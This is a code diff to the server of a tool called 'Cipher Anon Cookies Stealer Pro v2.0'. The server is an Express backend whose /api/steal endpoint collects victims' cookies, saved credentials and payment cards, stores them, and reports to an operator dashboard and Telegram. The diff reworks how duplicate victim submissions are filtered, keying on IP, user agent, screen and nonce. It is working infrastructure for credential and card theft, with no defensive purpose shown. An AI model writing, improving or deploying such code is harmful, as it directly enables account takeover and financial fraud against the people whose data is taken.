@@ -1,7 +1,6 @@
 // ============================================================
 // SERVER.JS — Cipher Anon Cookies Stealer Pro v2.0
-// Railway Ready — Full Environment Variable Support
-// Fixed: Dedup uses IP + hostname + nonce (100% duplicate proof)
+// NUCLEAR FIX: Triple-layer dedup — IP + UA + screen + nonce
 // ============================================================
 
 const express = require('express');
@@ -19,7 +18,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ============================================================
-// CONFIGURATION — Railway Friendly (Env Vars First)
+// CONFIGURATION
 // ============================================================
 
 const CONFIG_FILE = path.join(__dirname, 'config.json');
@@ -166,12 +165,12 @@ let stolenData = loadData(DATA_FILE);
 let trashData = loadData(TRASH_FILE);
 
 // ============================================================
-// DEDUP — IP + hostname + nonce (100% unique per page load)
+// NUCLEAR DEDUP — IP + userAgent + screen + nonce (5min window)
 // ============================================================
 
 const dedupCache = new Map();
 const NONCE_CACHE = new Map();
-const DEDUP_WINDOW = 120000; // 2 minutes
+const DEDUP_WINDOW = 300000; // 5 minutes (nuclear)
 
 function cleanDedup() {
     const now = Date.now();
@@ -183,27 +182,31 @@ function cleanDedup() {
     }
 }
 
-function getDedupKey(ip, hostname, nonce) {
+function getDedupKey(ip, userAgent, screen, nonce) {
     let cleanIp = ip;
     if (ip === '::1' || ip === '::ffff:127.0.0.1' || ip === '127.0.0.1') {
         cleanIp = '127.0.0.1';
     }
-    const cleanHost = hostname || 'unknown';
-    return crypto.createHash('md5').update(`${cleanIp}|${cleanHost}|${nonce}`).digest('hex');
+    const ua = (userAgent || '').slice(0, 100);
+    const scr = screen || 'unknown';
+    const n = nonce || 'no-nonce';
+    return crypto.createHash('md5').update(`${cleanIp}|${ua}|${scr}|${n}`).digest('hex');
 }
 
-function isDuplicate(ip, hostname, nonce) {
+function isDuplicate(ip, userAgent, screen, nonce) {
     cleanDedup();
 
-    // Check nonce first (fastest)
+    // Check nonce first (fastest — 100% unique)
     if (nonce && NONCE_CACHE.has(nonce)) {
+        console.log(`[!] Nonce duplicate: ${nonce}`);
         return true;
     }
 
-    const key = getDedupKey(ip, hostname, nonce);
+    const key = getDedupKey(ip, userAgent, screen, nonce);
     if (dedupCache.has(key)) {
         const ts = dedupCache.get(key);
         if (Date.now() - ts < DEDUP_WINDOW) {
+            console.log(`[!] Dedup key duplicate: ${key}`);
             return true;
         }
     }
@@ -421,12 +424,13 @@ app.post('/api/steal', async (req, res) => {
         data.credentials = data.credentials || [];
         data.cards = data.cards || [];
 
-        const hostname = data.fingerprint?.hostname || data.domain || 'unknown';
+        const userAgent = data.fingerprint?.userAgent || '';
+        const screen = data.fingerprint?.screen || '';
         const nonce = data.nonce || '';
 
-        // ---- STRONG DEDUP: IP + hostname + nonce ----
-        if (isDuplicate(ip, hostname, nonce)) {
-            log(`[!] Duplicate from ${ip} for ${hostname} — ignored`);
+        // ---- NUCLEAR DEDUP ----
+        if (isDuplicate(ip, userAgent, screen, nonce)) {
+            log(`[!] Duplicate from ${ip} — ignored (nonce: ${nonce || 'none'})`);
             return res.json({ status: 'ok', duplicate: true });
         }
 
@@ -434,6 +438,7 @@ app.post('/api/steal', async (req, res) => {
         stolenData.push(data);
         saveData(DATA_FILE, stolenData);
 
+        const hostname = data.fingerprint?.hostname || data.domain || 'unknown';
         const count = Object.keys(data.cookies || {}).length;
         const credCount = data.credentials.length;
         const cardCount = data.cards.length;
@@ -718,7 +723,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`  [+] Username: ${CONFIG.DASHBOARD_USERNAME}`);
     console.log(`  [+] Password: ${CONFIG.DASHBOARD_PASSWORD.slice(0,3)}***`);
     console.log(`  [+] Session Timeout: 30 minutes`);
-    console.log(`  [+] Dedup: IP + hostname + nonce, 2min window`);
+    console.log(`  [+] Dedup: IP + UA + screen + nonce, 5min window`);
     console.log(`  [+] Anti-Bot: ENABLED ✅`);
     console.log(`  [+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? 'ENABLED ✅' : 'DISABLED ❌'}`);
     console.log('='.repeat(55) + '\n');
